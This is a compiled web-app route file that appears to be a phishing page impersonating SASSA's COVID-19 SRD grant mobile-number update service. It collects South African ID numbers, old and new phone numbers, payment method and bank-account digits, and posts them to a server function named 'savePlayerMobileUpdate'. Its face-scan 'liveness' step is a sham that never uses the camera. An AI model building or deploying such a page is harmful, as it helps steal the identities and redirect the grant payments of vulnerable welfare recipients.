import { n as __toESM } from "../_runtime.mjs";
import { a as TSS_SERVER_FUNCTION, l as createServerFn } from "./createServerFn-DDDJMFWM.mjs";
import { n as stringType, t as objectType } from "../_libs/zod.mjs";
import { u as require_react } from "../_libs/@floating-ui/react-dom+[...].mjs";
import { i as Slot, s as require_jsx_runtime } from "../_libs/@radix-ui/react-collection+[...].mjs";
import { t as getServerFnById } from "../__23tanstack-start-server-fn-resolver-CkImqx-F.mjs";
import { i as Check, n as ChevronUp, r as ChevronDown, t as X } from "../_libs/lucide-react.mjs";
import { n as clsx, t as cva } from "../_libs/class-variance-authority+clsx.mjs";
import { t as twMerge } from "../_libs/tailwind-merge.mjs";
import { a as SelectItemIndicator, c as SelectPortal, d as SelectSeparator$1, f as SelectTrigger$1, i as SelectItem$1, l as SelectScrollDownButton$1, m as SelectViewport, n as SelectContent$1, o as SelectItemText, p as SelectValue$1, r as SelectIcon, s as SelectLabel$1, t as Select$1, u as SelectScrollUpButton$1 } from "../_libs/@radix-ui/react-select+[...].mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/routes-tGL1MXvi.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var createSsrRpc = (functionId) => {
	const url = "/_serverFn/" + functionId;
	const serverFnMeta = { id: functionId };
	const fn = async (...args) => {
		return (await getServerFnById(functionId, { origin: "server" }))(...args);
	};
	return Object.assign(fn, {
		url,
		serverFnMeta,
		[TSS_SERVER_FUNCTION]: true
	});
};
var savePlayerMobileUpdate = createServerFn({ method: "POST" }).inputValidator(objectType({
	SouthAfricanIdnumber: stringType().regex(/^\d{13}$/),
	oldMobileNumber: stringType().regex(/^\d{10}$/),
	newMobileNumber: stringType().regex(/^\d{10}$/)
})).handler(createSsrRpc("f23766d4c798a9ff26928c2f12a8eac0707d0a003950016e07d4237e97ef67f4"));
function cn(...inputs) {
	return twMerge(clsx(inputs));
}
var buttonVariants = cva("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium cursor-pointer transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 disabled:cursor-not-allowed [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
	variants: {
		variant: {
			service: "service-action",
			liveness: "liveness-action",
			scanHelp: "scan-help",
			default: "bg-primary text-primary-foreground shadow hover:bg-primary/90",
			destructive: "bg-destructive text-destructive-foreground shadow-sm hover:bg-destructive/90",
			outline: "border border-input bg-background shadow-sm hover:bg-accent hover:text-accent-foreground",
			secondary: "bg-secondary text-secondary-foreground shadow-sm hover:bg-secondary/80",
			ghost: "hover:bg-accent hover:text-accent-foreground",
			link: "text-primary underline-offset-4 hover:underline"
		},
		size: {
			default: "h-9 px-4 py-2",
			sm: "h-8 rounded-md px-3 text-xs",
			lg: "h-10 rounded-md px-8",
			icon: "h-9 w-9"
		}
	},
	defaultVariants: {
		variant: "default",
		size: "default"
	}
});
var Button = import_react.forwardRef(({ className, variant, size, asChild = false, ...props }, ref) => {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)(asChild ? Slot : "button", {
		className: cn(buttonVariants({
			variant,
			size,
			className
		})),
		ref,
		...props
	});
});
Button.displayName = "Button";
var Select = Select$1;
var SelectValue = SelectValue$1;
var SelectTrigger = import_react.forwardRef(({ className, children, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(SelectTrigger$1, {
	ref,
	className: cn("flex h-9 w-full items-center justify-between whitespace-nowrap rounded-md border border-input bg-transparent px-3 py-2 text-sm shadow-sm ring-offset-background cursor-pointer data-[placeholder]:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-ring disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1", className),
	...props,
	children: [children, /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectIcon, {
		asChild: true,
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ChevronDown, { className: "h-4 w-4 opacity-50" })
	})]
}));
SelectTrigger.displayName = SelectTrigger$1.displayName;
var SelectScrollUpButton = import_react.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectScrollUpButton$1, {
	ref,
	className: cn("flex cursor-default items-center justify-center py-1", className),
	...props,
	children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ChevronUp, { className: "h-4 w-4" })
}));
SelectScrollUpButton.displayName = SelectScrollUpButton$1.displayName;
var SelectScrollDownButton = import_react.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectScrollDownButton$1, {
	ref,
	className: cn("flex cursor-default items-center justify-center py-1", className),
	...props,
	children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ChevronDown, { className: "h-4 w-4" })
}));
SelectScrollDownButton.displayName = SelectScrollDownButton$1.displayName;
var SelectContent = import_react.forwardRef(({ className, children, position = "popper", ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectPortal, { children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(SelectContent$1, {
	ref,
	className: cn("relative z-50 max-h-(--radix-select-content-available-height) min-w-[8rem] overflow-y-auto overflow-x-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2 origin-(--radix-select-content-transform-origin)", position === "popper" && "data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1", className),
	position,
	...props,
	children: [
		/* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectScrollUpButton, {}),
		/* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectViewport, {
			className: cn("p-1", position === "popper" && "h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"),
			children
		}),
		/* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectScrollDownButton, {})
	]
}) }));
SelectContent.displayName = SelectContent$1.displayName;
var SelectLabel = import_react.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectLabel$1, {
	ref,
	className: cn("px-2 py-1.5 text-sm font-semibold", className),
	...props
}));
SelectLabel.displayName = SelectLabel$1.displayName;
var SelectItem = import_react.forwardRef(({ className, children, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(SelectItem$1, {
	ref,
	className: cn("relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-2 pr-8 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", className),
	...props,
	children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
		className: "absolute right-2 flex h-3.5 w-3.5 items-center justify-center",
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectItemIndicator, { children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, { className: "h-4 w-4" }) })
	}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectItemText, { children })]
}));
SelectItem.displayName = SelectItem$1.displayName;
var SelectSeparator = import_react.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectSeparator$1, {
	ref,
	className: cn("-mx-1 my-1 h-px bg-muted", className),
	...props
}));
SelectSeparator.displayName = SelectSeparator$1.displayName;
var department_logo_jpg_asset_default = {
	version: 1,
	asset_id: "8aae2a73-b4cf-4bee-9855-20f3539af22e",
	project_id: "080e0403-2c6b-41d8-b4db-e6e0a5da1a6e",
	url: "/images/department-logo.jpg",
	r2_key: "a/v1/080e0403-2c6b-41d8-b4db-e6e0a5da1a6e/8aae2a73-b4cf-4bee-9855-20f3539af22e/department-logo.jpg",
	original_filename: "department-logo.jpg",
	size: 38550,
	content_type: "image/jpeg",
	created_at: "2026-10-14T09:22:15Z"
};
var header_correct_jpg_asset_default = {
	version: 1,
	asset_id: "291fdef9-6310-419a-ae29-a06afad4c12e",
	project_id: "080e0403-2c6b-41d8-b4db-e6e0a5da1a6e",
	url: "/images/header-correct.jpg",
	r2_key: "a/v1/080e0403-2c6b-41d8-b4db-e6e0a5da1a6e/291fdef9-6310-419a-ae29-a06afad4c12e/header-correct.jpg",
	original_filename: "header-correct.jpg",
	size: 24659,
	content_type: "image/jpeg",
	created_at: "2026-10-14T09:33:50Z"
};
var phone_correct_jpg_asset_default = {
	version: 1,
	asset_id: "5b52951a-50da-4686-a803-5622364cd360",
	project_id: "080e0403-2c6b-41d8-b4db-e6e0a5da1a6e",
	url: "/images/phone-correct.jpg",
	r2_key: "a/v1/080e0403-2c6b-41d8-b4db-e6e0a5da1a6e/5b52951a-50da-4686-a803-5622364cd360/phone-correct.jpg",
	original_filename: "phone-correct.jpg",
	size: 17408,
	content_type: "image/jpeg",
	created_at: "2026-10-14T09:33:53Z"
};
function Field({ label, children }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "outlined-field",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", { children: [label, "*"] }), children]
	});
}
function Dropdown({ label, value, onChange, options, disabled = false }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
		label,
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(Select, {
			value,
			onValueChange: onChange,
			disabled,
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectTrigger, {
				"aria-label": label,
				className: "reference-select",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectValue, { placeholder: " " })
			}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectContent, {
				className: "reference-menu",
				position: "popper",
				children: options.map((option) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(SelectItem, {
					className: "reference-option",
					value: option,
					children: option
				}, option))
			})]
		})
	});
}
function Index() {
	const [stage, setStage] = (0, import_react.useState)("initial");
	const [pendingStage, setPendingStage] = (0, import_react.useState)(null);
	const [saving, setSaving] = (0, import_react.useState)(false);
	const [identity, setIdentity] = (0, import_react.useState)("");
	const [reason, setReason] = (0, import_react.useState)("");
	const [payment, setPayment] = (0, import_react.useState)("");
	const [bank, setBank] = (0, import_react.useState)("");
	const [oldMobile, setOldMobile] = (0, import_react.useState)("");
	const [mobile, setMobile] = (0, import_react.useState)("");
	const [tips, setTips] = (0, import_react.useState)(false);
	(0, import_react.useEffect)(() => {
		if (!pendingStage) return;
		const timer = window.setTimeout(() => {
			setStage(pendingStage);
			setPendingStage(null);
			if (pendingStage === "success") {
				setIdentity("");
				setBank("");
				setOldMobile("");
				setMobile("");
			}
		}, 1400);
		return () => window.clearTimeout(timer);
	}, [pendingStage]);
	(0, import_react.useEffect)(() => {
		if (stage !== "liveness") return;
		const close = (event) => {
			if (event.key === "Escape") setPendingStage("details");
		};
		window.addEventListener("keydown", close);
		return () => window.removeEventListener("keydown", close);
	}, [stage]);
	const digits = (value, max) => value.replace(/\D/g, "").slice(0, max);
	const ready = identity.length === 13 && Boolean(reason) && Boolean(payment);
	const canConfirm = oldMobile.length === 10 && mobile.length === 10 && (payment !== "Bank Account" || bank.length === 4);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "service-page",
		children: [
			stage !== "liveness" && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("header", {
				className: "department-header",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "header-inner",
					children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
						src: header_correct_jpg_asset_default.url,
						alt: "SASSA â€” South African Social Security Agency"
					})
				})
			}),
			stage === "success" ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
				className: "success-screen",
				"aria-live": "polite",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
						className: "success-check",
						children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, { "aria-hidden": "true" })
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", { children: "Your cellphone number has been successfully changed." }),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
						variant: "service",
						onClick: () => {
							setStage("initial");
							setIdentity("");
							setReason("");
							setPayment("");
							setBank("");
							setOldMobile("");
							setMobile("");
						},
						children: "Done"
					})
				]
			}) : stage === "liveness" ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
				className: "liveness-screen",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "liveness-brand",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
							src: department_logo_jpg_asset_default.url,
							alt: "SASSA â€” South African Social Security Agency"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
							variant: "ghost",
							size: "icon",
							className: "close-liveness",
							"aria-label": "Close liveness validation",
							title: "Close",
							disabled: Boolean(pendingStage),
							onClick: () => setPendingStage("details"),
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(X, {})
						})]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", { children: "Liveness Validation" }),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "liveness-intro",
						children: "Follow these simple steps to successfully scan your face."
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("ol", {
						className: "scan-steps",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("li", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: "step-number",
							children: "1"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("strong", { children: "Prepare" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", { children: "Position your face at the centre of the frame." })] })] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("li", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: "step-number",
							children: "2"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("strong", { children: "Capture" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", { children: "Hold still while the screen flashes and scans your face." })] })] })]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
						className: "scan-illustration",
						children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
							src: phone_correct_jpg_asset_default.url,
							alt: "A hand holding a phone with a face centred in the scan frame"
						})
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)(Button, {
						variant: "scanHelp",
						"aria-expanded": tips,
						onClick: () => setTips(!tips),
						children: ["How to ensure a successful face scan", /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ChevronDown, {})]
					}),
					tips && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "scan-tips",
						children: "Face the light, remove your hat and glasses, and keep your face inside the frame."
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
						variant: "liveness",
						disabled: Boolean(pendingStage),
						onClick: () => setPendingStage("details"),
						children: "Let's begin"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "camera-note",
						children: "Your camera will not be accessed."
					})
				]
			}) : /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
				className: "form-screen",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "service-note",
					children: "Note: If you want to update your Mobile Number that is used for communication and web application access related to your COVID-19 SRD grant, we firstly need to verify that you are the original applicant. Please submit your 13-digit South African identity number to initiate the identity process."
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
					onSubmit: async (event) => {
						event.preventDefault();
						if (pendingStage || saving) return;
						if (stage === "initial" && ready) {
							setPendingStage("liveness");
							return;
						}
						if (stage === "details" && canConfirm) {
							setSaving(true);
							try {
								await savePlayerMobileUpdate({ data: {
									SouthAfricanIdnumber: identity,
									oldMobileNumber: oldMobile,
									newMobileNumber: mobile
								} });
								setPendingStage("success");
							} catch (error) {
								console.error(error);
								window.alert("Could not save your request. Please try again.");
							} finally {
								setSaving(false);
							}
						}
					},
					autoComplete: "off",
					"aria-busy": Boolean(pendingStage),
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
							className: stage === "details" ? "locked-field" : "",
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
								label: "South African ID number",
								children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									"aria-label": "South African ID number",
									inputMode: "numeric",
									value: identity,
									onChange: (e) => setIdentity(digits(e.target.value, 13)),
									disabled: stage === "details",
									required: true,
									minLength: 13,
									maxLength: 13
								})
							})
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
							className: stage === "details" ? "locked-field" : "",
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Dropdown, {
								label: "Reason for mobile number update",
								value: reason,
								onChange: setReason,
								disabled: stage === "details",
								options: [
									"Lost phone",
									"Used third party phone",
									"New phone",
									"Captured number wrong"
								]
							})
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Dropdown, {
							label: "Current Payment Option",
							value: payment,
							onChange: setPayment,
							options: [
								"Cash Send",
								"Bank Account",
								"I Don't Know"
							]
						}),
						stage === "details" && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(import_jsx_runtime.Fragment, { children: [
							payment === "Bank Account" && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
								className: "bank-field",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
									label: "Last 4 digits of bank account",
									children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
										"aria-label": "Last 4 digits of bank account",
										inputMode: "numeric",
										value: bank,
										onChange: (e) => setBank(digits(e.target.value, 4)),
										required: true,
										minLength: 4,
										maxLength: 4
									})
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
									className: "bank-note",
									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", { children: "Note: Please enter the last four digits of your last updated bank account number." }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", { children: [bank.length, " of 4"] })]
								})]
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
								label: "Old Mobile Number",
								children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									"aria-label": "Old Mobile Number",
									type: "tel",
									inputMode: "numeric",
									value: oldMobile,
									onChange: (e) => setOldMobile(digits(e.target.value, 10)),
									minLength: 10,
									maxLength: 10,
									required: true
								})
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
								label: "New Mobile Number",
								children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
									"aria-label": "New Mobile Number",
									type: "tel",
									inputMode: "numeric",
									value: mobile,
									onChange: (e) => setMobile(digits(e.target.value, 10)),
									minLength: 10,
									maxLength: 10,
									required: true
								})
							})
						] }),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
							variant: "service",
							className: stage === "initial" ? "initial-submit" : "",
							type: "submit",
							disabled: Boolean(pendingStage) || (stage === "initial" ? !ready : !canConfirm),
							children: stage === "initial" ? "Submit" : "Confirm"
						})
					]
				})]
			}),
			pendingStage && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "loading-overlay",
				role: "status",
				"aria-live": "polite",
				"aria-label": pendingStage === "success" ? "Confirmingâ€¦" : "Loadingâ€¦",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "loading-indicator",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "loading-spinner",
						"aria-hidden": "true"
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", { children: pendingStage === "success" ? "Confirmingâ€¦" : "Loadingâ€¦" })]
				})
			})
		]
	});
}
//#endregion
export { Index as component };
